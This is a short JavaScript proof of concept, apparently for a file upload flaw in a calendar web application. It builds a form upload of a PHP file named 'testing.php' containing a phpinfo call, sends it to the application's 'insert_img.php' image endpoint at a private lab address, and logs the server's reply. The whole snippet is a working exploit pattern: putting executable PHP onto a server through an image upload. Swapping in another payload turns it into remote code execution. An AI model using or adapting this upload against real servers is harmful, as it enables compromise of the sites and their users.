function read_body(xhr) {
    var data;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
    } else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    } else if (xhr.responseType === "json") {
        data = xhr.responseJSON;
    } else {
        data = xhr.response;
    }
    return data;
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
    console.log(read_body(xhr));
    }
}

var fd = new FormData();
var content = '<?php phpinfo(); ?>';
var blob = new Blob([content], { type: "application/x-php"});
fd.append("userfile", blob, "testing.php");
fd.append("url", "http://");
console.log(fd);

xhr.open('POST', 'http://172.16.65.130/calendar/insert_img.php?upload=file', true);
  
xhr.send(fd);
